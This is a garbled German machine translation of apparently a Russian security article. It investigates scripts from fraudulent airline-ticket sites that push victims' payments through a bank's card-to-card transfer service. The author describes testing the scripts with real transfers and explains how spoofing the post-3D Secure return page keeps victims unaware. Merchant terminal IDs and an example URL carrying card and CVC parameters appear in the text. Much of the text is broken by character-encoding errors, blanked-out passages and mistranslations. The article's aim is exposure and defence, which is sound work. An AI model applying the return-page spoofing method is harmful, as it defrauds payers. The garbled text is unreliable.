Wenn Sie zum ersten Mal eine Verbindung herstellen, schwÃ¶rt der Browser natÃ¼rlich auf die falsch konfigurierte sichere Verbindung. Dies liegt an der Tatsache, dass wir ein selbstsigniertes Zertifikat haben. </font></font><br>
<br>
<img src="https://habrastorage.org/files/8d1/ff3/73f/8d1ff373f65d4f70af5fa16538e13d5d.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Da die Quelle des Zertifikats bekannt ist, fÃ¼gen wir es den Ausnahmen hinzu. </font></font><br>
<br>
<img src="https://habrastorage.org/files/06a/317/d22/06a317d220884c5b93844dff1929907e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das ist alles. Jetzt wird die Verbindung Ã¼ber https hergestellt und beim Wechsel von der Sberbank-Website verschwinden die Warnungen. </font></font><br>
<br>
<img src="https://habrastorage.org/files/df9/2c7/ad5/df92c7ad553e492e9192167abb150826.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach Eingabe des 3D Secure-Codes erfolgt die RÃ¼ckkehr zur speziell vorbereiteten Seite korrekt. </font></font><br>
<br>
<img src="https://habrastorage.org/files/0a7/21a/677/0a721a677a9a46e68605c7f03beb4bc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Alles funktioniert gut, auÃŸer </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dass Geld nicht wirklich funktioniert</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Infolgedessen musste ich mehrere Tage lang testen und suchen, was der Grund sein kÃ¶nnte.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich hatte nur einen Teil der Dateien, die auf einer der betrÃ¼gerischen Websites fÃ¼r Flugtickets verwendet werden. Unter den Dateien, die mir gesendet wurden, befand sich eine file.php-Datei. Dies Ã¤hnelt dem oben analysierten Skript. Dem Code nach zu urteilen, wurde es wahrscheinlich nicht erstellt, um Besucher auf der â€Kampfseiteâ€œ zu tÃ¤uschen, sondern um von einem Programmierer-Entwickler die MÃ¶glichkeit zu testen, Ã¼ber den Dienst 3ds.payment.ru von einer Karte auf eine andere zu Ã¼bertragen. Es ist unwahrscheinlich, aber theoretisch kÃ¶nnte es in den frÃ¼hen Versionen betrÃ¼gerischer Websites nicht nur zum Testen verwendet werden. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ich habe versucht, eine Zahlung mit dem alternativen Skript "payment.php" vorzunehmen, und die Zahlung wurde beim ersten Mal ausgefÃ¼hrt.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die BestÃ¤tigung der erfolgreichen Zahlung wurde nur auf der Website 3ds.payment.ru angezeigt. </font><font style="vertical-align: inherit;">Da dieses Skript funktioniert, kann der Grund gefunden werden, warum das erste Skript in der Beschreibung (payp2p.php) nicht funktioniert.</font></font><br>
<br>
<img src="https://habrastorage.org/files/113/941/882/1139418821c64ae4a67cdefba3b3fd59.png"><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VollstÃ¤ndiger Skriptcode payment.php unter dem Spoiler</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/c65/c1f/56d/c65c1f56d0fe4e8c895bfbcd98109349.png"><br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beschreibung der Unterschiede zwischen den Skripten payment.php und payp2p.php</font></font></b><div class="spoiler_text">     .    .<br>
<br>
 payp2p.php       POST  .  payment.php     GET    .  ,      ,       :<br>
<br>
<code>https://p2p.localhost/payment.php?card_1=1111&amp;card_2=2222...&amp;cvc=999...&amp;price=30... </code><br>
<br>
    ,         Â« Â».<br>
<br>
Payment.php    payp2p.php       MySQL.        .       .<br>
<br>
Payment.php      .        ,     .   ,  payp2p.php    ,   ,  payment.php      . TERMINAL=24043210, MERCH_NAME=PSB, MERCHANT=000601224043202, EMAIL=lakhtin%40psbank.ru, TRTYPE=8 (    TRTYPE    .   payp2p.php  ).<br>
<br>
  â€” payment.php         <code>https://3ds.payment.ru/cgi-bin/is_3DS</code>.          <code>{"IS_ACTIVE":"Y"}</code>      ,        (   3D Secure).<br>
<br>
    .      payment.php     .  ,        3ds.payment.ru.<br>
</div></div><br>
<blockquote>  â€¦  ,       Firefox,  Â«Â»  payment.php      (Â«Firefox/3.0.3Â»),  ,          , ,           . ,  3.5 Firefox    2009 ,  4 Firefox     2011,      payp2p.php ,  Â«Firefox/38.0Â»,      2016  â€” Firefox 49.</blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dann gab es Versuche, das Skript payp2p.php zu reparieren, das aus irgendeinem Grund nicht funktionierte, um es zu reparieren, wobei das Arbeitsskript als Grundlage diente. Es wurden verschiedene Optionen ausprobiert. Alle Codeteile, die sich irgendwie auf die Arbeit auswirken kÃ¶nnten, wurden vom Arbeitsskript auf das nicht funktionierende Ã¼bertragen. Unter anderem wurde versucht, eine zusÃ¤tzliche Zwischenverbindung zu herzustellen </font></font><code>https://3ds.payment.ru/cgi-bin/is_3DS</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; Ã„ndern, Ein- und Ausschalten der Optionen cURL usw. Nichts half, die Steinblume kam nicht heraus. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
SpÃ¤ter, wÃ¤hrend des Tests, wurde beschlossen, Weiterleitungen in der letzten Phase von payp2p.php zu deaktivieren. Danach wurde es mÃ¶glich, die Fehlermeldung der Promsvyazbank zu lesen. Screenshot des Fehlers unten. Nach einem erfolglosen Zahlungsversuch wird im Browser eine andere Seite angezeigt. Wenn Sie jedoch ein- oder mehrmals auf "ZurÃ¼ck" klicken, wird diese Seite angezeigt.</font></font><br>
<br>
<img src="https://habrastorage.org/files/11f/86c/ecd/11f86cecd02b46828d04419e18f8354b.png"><br>
<blockquote>: <br>
<br>
,         . <br>
<br>
  : /   (/)<br>
,       ,    / </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es gibt einige EinschrÃ¤nkungen hinsichtlich der Anzahl der Zahlungen von einer Karte pro Tag auf der Website der Promsvyazyazbank usw. Obwohl ich die Begrenzung der Anzahl der tatsÃ¤chlichen Zahlungen nicht Ã¼berschritten habe, ist es mÃ¶glich, dass die Zahlungen aufgrund der groÃŸen Anzahl meiner Versuche zu einem bestimmten Zeitpunkt nicht ausgefÃ¼hrt wurden. (Um die Werte von Variablen wÃ¤hrend des Debuggens zu erfassen, habe ich den Zahlungsvorgang viele Male gestartet, aber nicht abgeschlossen.) Ich kenne den genauen Grund fÃ¼r diese Nachricht nicht. Bei jedem Versuch, ORDER_NUM und TIMESTAMP zu bezahlen, wird ein neuer verwendet. Sie sollten das Auftreten eines solchen Fehlers nicht beeinflusst haben. Obwohl die Karte, die ich fÃ¼r die Zahlung verwendet habe, eine erfolgreiche Zahlung durch ein alternatives script.php-Skript ging, wurde mÃ¶glicherweise die Karte des Absenders oder des EmpfÃ¤ngers in die Stoppliste aufgenommen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Skript payp2p.php war bereits ein wenig wie sein ursprÃ¼nglicher Zustand. Ich selbst begann verwirrt zu werden, was ich darin ersetzte und was nicht. Daher habe ich es auf seine ursprÃ¼ngliche Form zurÃ¼ckgesetzt, auÃŸer dass in den letzten Zeilen die Umleitung der Umleitung auf die erfolgreiche Zahlungsseite deaktiviert war. Die Kartennummern des Absenders und EmpfÃ¤ngers fÃ¼r nachfolgende Versuche wurden neu verwendet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mit Hilfe von payp2p.php stellte sich schlieÃŸlich heraus, dass die Zahlung erfolgreich war. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9cd/606/539/9cd60653958e4dda9fa38ef0e9826092.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Achten Sie auf die Unterschrift in der Zeile "Beschreibung". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach Eingabe des 3D Secure-BestÃ¤tigungscodes erfolgt die RÃ¼ckkehr zur Promsvyazbak-Seite: </font></font><br>
<br>
<img src="https://habrastorage.org/files/fed/cb7/370/fedcb7370bcb4995a20a9a7218c6bdbc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Empfangene SMS. Links von der Bank des Absenders. Rechts von der Bank des BegÃ¼nstigten. </font></font><br>
<br>
<img src="https://habrastorage.org/files/463/935/875/46393587535a428384fc62522d5154ff.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sberbank, aus irgendeinem Grund, in SMS-Zeit GMT angegeben. Bisher habe ich dies in Nachrichten dieser Bank nicht bemerkt.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn die Ersetzung der RÃ¼ckgabeseite deaktiviert ist, wiederholen Sie die erfolgreiche Zahlung mit dem Skript payp2.php, das sich viele Male herausgestellt hat. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich habe versucht, mit anderen Karten zu bezahlen. Jede Bank stellt ihr 3D Secure-Formular aus. Dies Ã¤ndert jedoch nichts an der Essenz. </font></font><br>
<br>
<img src="https://habrastorage.org/files/452/684/b75/452684b75ede43deaca4c3c448d77bf5.png"><br>
<br>
<img src="https://habrastorage.org/files/671/19c/d9f/67119cd9f13b4b1b92c43903c4a5a466.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bitte beachten Sie, dass nicht alle Banken eine â€zusÃ¤tzliche Beschreibungâ€œ in ihr BestÃ¤tigungsformular aufnehmen. In unserem Beispiel "Ticket bezahlen".</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es ist nicht erforderlich, sich an die Seite jeder Bank anzupassen. Obwohl die Formen unterschiedlich sind, ist der Mechanismus der Substitution fÃ¼r sie der gleiche. Jedes Formular nach der Zahlung enthÃ¤lt einen Link mit der Adresse der Seite, an die Sie zurÃ¼ckkehren mÃ¶chten. Die Banken selbst, die 3D Secure-ÃœberprÃ¼fungsformulare bereitstellen, werden hÃ¶chstwahrscheinlich nicht an die â€linke Siteâ€œ zurÃ¼ckgeschickt. Sicherlich gibt es einige Regeln, und Banken aus dem 3DS-ÃœberprÃ¼fungsformular sollten zumindest zu derselben Domain zurÃ¼ckkehren, von der die Zahlungsanforderung empfangen wurde. (In unserem Fall unter 3ds.payment.ru). Die Bank, die den 3D Secure-Code Ã¼berprÃ¼ft, gibt bei korrekter Eingabe des Kennworts im HTML-Code der Seite die Adresse an, an die zurÃ¼ckgegeben werden muss, kann jedoch nicht mehr steuern, ob auf diese Seite zurÃ¼ckgekehrt werden soll.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Als Ergebnis aller Experimente war es mÃ¶glich, das Skript payp2p.php Ã¼ber den Ãœberweisungsdienst von Karte zu Karte der Promsvyazbank 3ds.payment.ru bezahlen zu lassen. Gleichzeitig musste ich das Ersetzen der Absenderadresse in den letzten Zeilen des Skripts deaktivieren. Wenn Sie das Spoofing der Adresse der RÃ¼ckseite wie im ursprÃ¼nglichen Skript aktivieren, wird derzeit kein Geld mehr ausgegeben. Die Seite zur ÃœberprÃ¼fung von 3D Secure wird angezeigt. SMS mit "Passwort" wird gesendet; Das BestÃ¤tigungsformular springt nicht zum nÃ¤chsten Schritt, wenn Sie das falsche Passwort eingeben. Nach Eingabe des richtigen "Passworts" wird auf eine gefÃ¤lschte Seite weitergeleitet, aber das Geld geht nicht weiter.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die FÃ¤lschung der RÃ¼ckseitenadresse fÃ¼r eine erfolgreiche Zahlung ist ein sehr wichtiger Bestandteil fÃ¼r betrÃ¼gerische Websites. Wenn der â€KÃ¤ufer von Ticketsâ€œ nicht den Verdacht hat, dass er getÃ¤uscht wurde, kann er nicht nur einen, sondern mehrere TicketkÃ¤ufe bezahlen und danach fÃ¼r eine lange Zeit (Tage und Wochen) keine aktiven MaÃŸnahmen ergreifen, um die Zahlung zu stornieren usw. Wenn der KÃ¤ufer nach dem "Bezahlen von Flugtickets" eine BestÃ¤tigung der Ãœberweisung von Karte zu Karte erhÃ¤lt, wird er hÃ¶chstwahrscheinlich die folgenden Zahlungen nicht mehr leisten, er wird sich viel schneller an seine Bank und mÃ¶glicherweise an die Polizei wenden. Dies bedeutet, dass der Cashflow auf betrÃ¼gerischen Websites reduziert wird, die Wahrscheinlichkeit, dass frÃ¼here Zahlungen storniert werden, steigt, StrafverfolgungsbehÃ¶rden und Hosting-Mitarbeiter frÃ¼her handeln und die Wahrscheinlichkeit, keine Zeit zu haben, gestohlenes Geld an einen sicheren Ort abzuheben, steigt.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich habe keinen Zweifel daran, dass dieses Skript auf einer Website fÃ¼r betrÃ¼gerische KÃ¤mpfe verwendet wurde. Ich habe Grund zu der Annahme, dass es in der Form funktioniert hat, in der es mir zur VerfÃ¼gung gestellt wurde. Derzeit funktioniert es nur eingeschrÃ¤nkt (keine Weiterleitungen).</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
UngefÃ¤hr drei Wochen nach VerÃ¶ffentlichung des ersten Teils der VerÃ¶ffentlichung, in der BetrÃ¼ger erwÃ¤hnt wurden, die den Card-to-Card-Ãœberweisungsdienst der Promsvyazbank nutzen, nahm diese Bank einige Ã„nderungen an ihrem Dienst vor, die ich fÃ¼r wichtig halte. FrÃ¼her erhielten die Zahler beim Bezahlen Ã¼ber die Website der Promsvyazbank unverstÃ¤ndliche SMS mit dem Text â€P2P PSBANKâ€œ, jetzt jedoch SMS mit dem Text â€CARD2CARD PSBANK.RUâ€œ. Selbst auf den ersten Blick reicht eine geringfÃ¼gige Ã„nderung der EntschlÃ¼sselung des Zahlungszwecks aus, damit einige potenzielle Opfer von BetrÃ¼gern die Zahlung in der BestÃ¤tigungsphase stornieren kÃ¶nnen. Ich denke, dies ist kein Zufall, und die Ã„nderungen wurden genau aufgrund der VerÃ¶ffentlichung des Artikels auf GeekTimes vorgenommen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es ist wahrscheinlich, dass nach der VerÃ¶ffentlichung des ersten Teils des Artikels zusammen mit der Ã„nderung des BestÃ¤tigungstextes in SMS zusÃ¤tzliche Anpassungen an den Algorithmen des Ãœberweisungsdienstes von Karte zu Karte der Promsvyazbank vorgenommen werden kÃ¶nnten. </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ich kann nicht 100% sagen, aber ich bin der Meinung, dass 3ds.payment.ru vor dem Service der Promsvyazbank mit hoher Wahrscheinlichkeit die RÃ¼ckkehr der Benutzer zu ihrer Website nicht Ã¼berprÃ¼ft hat, nachdem der 3D Secure-Code auf den Websites von Banken, die Kartenzahler ausstellen, erfolgreich eingegeben wurde. Daher wurden Zahlungen auch dann ausgefÃ¼hrt, wenn betrÃ¼gerische Skripte die RÃ¼ckgabeseite verÃ¤nderten.</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Bank, die in dieser Publikation oft erwÃ¤hnt wird, hatte GlÃ¼ck mit kostenloser Werbung. Ich denke, dass es in Wirklichkeit immer noch eine ausreichende Anzahl solcher Banken gibt. Es ist nur insofern glÃ¼cklicher, als es zuerst fÃ¼r die Verwendung auf betrÃ¼gerischen Websites und dann fÃ¼r die Analyse in diesem Artikel ausgewÃ¤hlt wurde. Wie sie sagen, gibt es keine gesunden Patienten, es gibt schlecht untersuchte Patienten. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beim Schreiben dieses Artikels hat sich die Aufgabe, ein betrÃ¼gerisches Kampfskript zu erstellen, nicht gelohnt. Die Aufgabe bestand darin, zu verstehen, wie es funktioniert oder funktioniert, um die GrÃ¼nde zu verstehen, warum â€KÃ¤ufer von Flugticketsâ€œ getÃ¤uscht werden kÃ¶nnten, und daraus Schlussfolgerungen zu ziehen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Artikel wirft viele Fragen auf, bietet jedoch nicht alle Antworten. </font><font style="vertical-align: inherit;">Ich bin sicher, dass es unter den Lesern eine ausreichende Anzahl fortgeschrittener Benutzer geben wird, die das klinische Bild genauer kommentieren und eine Diagnose stellen kÃ¶nnen. </font><font style="vertical-align: inherit;">Ich fÃ¼r meinen Teil habe versucht, das Zeugnis so vollstÃ¤ndig wie mÃ¶glich zu prÃ¤sentieren ... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ein Teil der VerÃ¶ffentlichung mit der Analyse des Zahlungsskripts ist abgeschlossen. </font><font style="vertical-align: inherit;">Weitere Boni fÃ¼r diejenigen, die an diesem Ort lesen konnten.</font></font><br>
<hr><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher kommen billige FlÃ¼ge auf betrÃ¼gerischen Websites? </font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im vorherigen Teil der VerÃ¶ffentlichung wurde durch indirekte Zeichen gezeigt, dass Informationen Ã¼ber die VerfÃ¼gbarkeit von PlÃ¤tzen und Preisen programmgesteuert auf einer ehrlichen Website abgerufen, geÃ¤ndert und an den Benutzer ausgegeben werden.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Informationen zu VerfÃ¼gbarkeit und Preisen auf einer betrÃ¼gerischen Website</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7a5/1e4/8a8/7a51e48a8a3d4d8aabb8ea4acdbd053e.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jetzt haben wir die MÃ¶glichkeit, hinter die Kulissen zu schauen und zu sehen, wie dies im Programmcode implementiert ist. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier ist die Stelle im Code der betrÃ¼gerischen Website, an der wir sehen, woher die Bilder und Preise fÃ¼r FlÃ¼ge von betrÃ¼gerischen Websites stammen. </font></font><br>
<br>
<img src="https://habrastorage.org/files/e65/0c5/25b/e650c525b0424acf861678766f7eb75c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie in dieser Reihe betrÃ¼gerischer Websites zu erwarten, werden Informationen zu verfÃ¼gbaren PlÃ¤tzen auf einer ehrlichen Website abgerufen </font></font><code>www.aviacassa.ru</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Da die Anzahl der Fluggesellschaften und FlÃ¼ge groÃŸ ist, ist es sehr schwierig, alle Bilder und Symbole in einer solchen Ausgabe im Voraus herunterzuladen. Links zu solchen Bildern werden direkt auf der ursprÃ¼nglichen Website belassen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der Rabatt wird vom erhaltenen Originalpreis fÃ¼r Flugtickets abgezogen. Wie bereits gezeigt, kann der EigentÃ¼mer einer betrÃ¼gerischen Website den Rabattbetrag beliebig festlegen. Der Rabattbetrag wird in der Datei aviacfg.php gespeichert.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ein vollstÃ¤ndigerer Code, der dafÃ¼r verantwortlich ist, Informationen Ã¼ber die VerfÃ¼gbarkeit von SitzplÃ¤tzen zu erhalten, Links zu Bildern zu erstellen und Preise unter dem Spoiler zu Ã¤ndern.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Preisparser - ein vollstÃ¤ndigerer Teil des Codes</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/cf0/e74/617/cf0e7461727a4415bf018283c1cdf15c.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir werden dieses StÃ¼ck nicht Zeile fÃ¼r Zeile zerlegen, da nicht der Code selbst wichtig ist, sondern die Idee, wie und woher die tatsÃ¤chlichen Daten auf Flugtickets fÃ¼r betrÃ¼gerische Websites stammen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der alte Parser verwendete eine andere Site, um Daten </font></font><br>
<br>
<img src="https://habrastorage.org/files/e7e/625/9d8/e7e6259d8cc84a1586e61e7005ac6d3f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
abzurufen </font><font style="vertical-align: inherit;">: </font><font style="vertical-align: inherit;">Tipp fÃ¼r das TicketbÃ¼ro </font></font><code>(www.aviacassa.ru)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- Sie mÃ¼ssen die MÃ¶glichkeit von Links zu Domain-Dateien von einem externen Referrer (verweisende Site) schlieÃŸen. </font><font style="vertical-align: inherit;">Diese MÃ¶glichkeit kann ausnahmslos fÃ¼r alle geschlossen werden, oder Sie kÃ¶nnen Ausnahmen nur fÃ¼r vertrauenswÃ¼rdige Partner machen. </font><font style="vertical-align: inherit;">Der NGINX-Webserver, der Aviacassa verwendet, macht dies einfach. </font><font style="vertical-align: inherit;">Dieselbe Empfehlung fÃ¼r alle Ã¤hnlichen Websites, die als â€Informationsspenderâ€œ verwendet werden kÃ¶nnen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn betrÃ¼gerische Websites nicht direkt mit Bildern auf Websites wie Ticketschaltern verknÃ¼pft werden kÃ¶nnen, wird dies ihr Leben verkomplizieren. Die Anzahl der Logos und Bilder verschiedener Fluggesellschaften ist nicht im Voraus bekannt. Selbst wenn Sie versuchen, die Bilder im Voraus herunterzuladen, kÃ¶nnen Sie etwas Ã¼berspringen, und die betrÃ¼gerische Website sieht hÃ¤sslich aus. Solche Sites mÃ¼ssen bei jeder Anforderung alle Bilder lokal auf den Server herunterladen oder zumindest prÃ¼fen, ob ein solches Bild zuvor in den "Cache" heruntergeladen wurde oder nicht. Dies erhÃ¶ht die Belastung des Betrugsservers und verlangsamt das Rendern von Seiten. DarÃ¼ber hinaus fÃ¼hrt die SchlieÃŸung der MÃ¶glichkeit, gleichzeitig direkt auf Bilder zu verlinken, dazu, dass alle aktuellen betrÃ¼gerischen Websites, die TicketbÃ¼roinformationen verwenden, nicht mehr funktionieren.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
NatÃ¼rlich werden Entwickler im Laufe der Zeit Patches erstellen. </font><font style="vertical-align: inherit;">Da betrÃ¼gerische Websites jedoch nicht zentral verwaltet werden und verschiedene Personen keine automatischen Software-Updates haben, muss jeder EigentÃ¼mer einer betrÃ¼gerischen Website nach einer MÃ¶glichkeit zum Upgrade suchen. </font><font style="vertical-align: inherit;">Jemand wird den aktualisierten Code finden, aber jemand wird ihn nicht finden und die Site funktioniert nicht mehr. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das TicketbÃ¼ro kann auch ein separates Protokoll fÃ¼r solche Bilder enthalten, in dem Aufzeichnungen Ã¼ber alle externen Verweise (verweisende Websites) gespeichert werden. </font><font style="vertical-align: inherit;">In wenigen Tagen erhalten Sie in diesem Protokoll eine Liste aller aktiven betrÃ¼gerischen Websites. </font><font style="vertical-align: inherit;">Dies ist sehr praktisch. Anstatt zu versuchen, jede Site einzeln zu finden, kÃ¶nnen Sie sie bitten, sich unabhÃ¤ngig in der Liste (Protokolldatei) zu registrieren.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Und wenn es lustige Administratoren an der Kasse gibt, kÃ¶nnen Sie einen Witz machen ...</font></font></b><div class="spoiler_text"> - NGINX           ,    ,  Â«Â»        ,         URL ,   .     .   â€”   Â« Â»   ,        -, ,  ,       ,     .</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jemand kÃ¶nnte sagen, dass die VerÃ¶ffentlichung solcher Artikel als Schulungsinstrument fÃ¼r BetrÃ¼ger dient, und eine Frage stellen, warum ich sie hier gepostet habe. Ich antworte. Wenn es eine MÃ¶glichkeit gibt, Geld zu stehlen, basierend auf der Verwendung anfÃ¤lliger oder unzureichend geschÃ¼tzter Software, von der zumindest einige wenige wissen und deren Ziel es ist, Geld damit zu verdienen, fÃ¼hrt ein Versuch, solche Informationen zu verbergen und so zu tun, als gÃ¤be es keine Probleme, nur dazu noch schlimmere Folgen. BetrÃ¼ger setzen diese Methoden noch aktiver ein, wÃ¤hrend die Banken glÃ¼cklich sind, weil sie regelmÃ¤ÃŸig die Provision fÃ¼r Dienstleistungen zahlen und ihnen Geld stehlen. Warum mÃ¼ssen Banken etwas Ã¤ndern, wenn alles so gut ist? Von Zeit zu Zeit werden nur einige Internetnutzer getÃ¤uscht und verlieren Geld auf betrÃ¼gerischen Websites. Aber wen interessiert das?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Meiner Meinung nach wird es fÃ¼r BetrÃ¼ger im Laufe der Zeit viel schwieriger, Geld zu stehlen, wenn eine â€kniffligeâ€œ Gelegenheit, Geld zu stehlen, einer sehr groÃŸen Anzahl von Menschen bekannt wird, und es wird fÃ¼r Organisationen, die es nutzen, unmÃ¶glich, Probleme zu ignorieren. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Skript payp2.php und eine Reihe von Dateien, die in einer Reihe von betrÃ¼gerischen Websites fÃ¼r den Verkauf von Fluggesellschaften verwendet wurden, wurden mir vom Benutzer </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Frozenstorm gesendet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Ich weiÃŸ nicht, woher er es hat - richten Sie alle Fragen zu diesem Thema direkt an ihn.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aber ich kann sofort sagen, dass es, wie sich spÃ¤ter herausstellte, nicht schwierig ist, den vollstÃ¤ndigen Satz von Quellcodes fÃ¼r betrÃ¼gerische Websites zu finden, die Flugtickets verkaufen. </font><font style="vertical-align: inherit;">Gesucht nach "gefÃ¤lschten FlÃ¼gen". </font><font style="vertical-align: inherit;">Beide groÃŸen Suchmaschinen bieten Links auf der ersten Seite. </font><font style="vertical-align: inherit;">Ein vollstÃ¤ndiger Satz von Quellcodes kostet nur 25-30 Tonnen Rubel. </font><font style="vertical-align: inherit;">Nachdem dieses Thema nicht mehr funktionierte, kosteten nicht funktionierende Quellcodes, die laut VerkÃ¤ufer â€einfach zu beendenâ€œ sind, 10 Billionen. </font><font style="vertical-align: inherit;">Nach den Nachrichten in den Foren zu urteilen, wird Version 2.0 vor kurzem angeblich wieder zu einem Preis von 25tr zum Verkauf angeboten. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Unten finden Sie ein Spoiler-Beispiel fÃ¼r den kostenlosen Verkauf des Quellcodes einer betrÃ¼gerischen Website fÃ¼r den Verkauf von Flugtickets in einem der Foren.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Screenshot des Forums. </font><font style="vertical-align: inherit;">(Ordentliche, sehr lange Bilder)</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7bc/69f/693/7bc69f6935294a76ba54c22e6fc2376f.jpg"><br>
<div class="spoiler"><b class="spoiler_title"> .  (2/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/823/4a0/f64/8234a0f641be4ef1a1acfe4fe4c8c7b4.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (3/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/147/0d7/d85/1470d7d857c2462c9a8948a64348d13e.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (4/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/743/5ad/aef/7435adaef04748b987b38b5cac75590a.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (5/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/1a1/519/eb6/1a1519eb638949be87239514e44edec9.jpg"><br>
</div></div><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Forum, das im Screenshot gezeigt wird, werden Codes Ã¤hnlicher betrÃ¼gerischer Websites, Kreditkarteninformationen, Passdaten, persÃ¶nliche Informationen aus staatlichen Datenbanken offen verkauft und gekauft. Es wird vorgeschlagen, gefÃ¤lschte PÃ¤sse, FÃ¼hrerscheine usw. zu erstellen. Dies ist zum Beispiel nur eine kurze Liste. Das heiÃŸt, Mit seltenen Ausnahmen gibt es andauernde KriminalitÃ¤t. Gleichzeitig fungiert die Forumverwaltung als Garant zwischen KÃ¤ufern und VerkÃ¤ufern. Es gibt mehrere Foren wie dieses. Sie alle arbeiten jahrelang frei. Alle von ihnen werden von Suchmaschinen (Yandex, Google usw.) perfekt indiziert. Ich zitiere nicht die Adresse eines bestimmten Forums. Sie sind sehr leicht zu finden.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
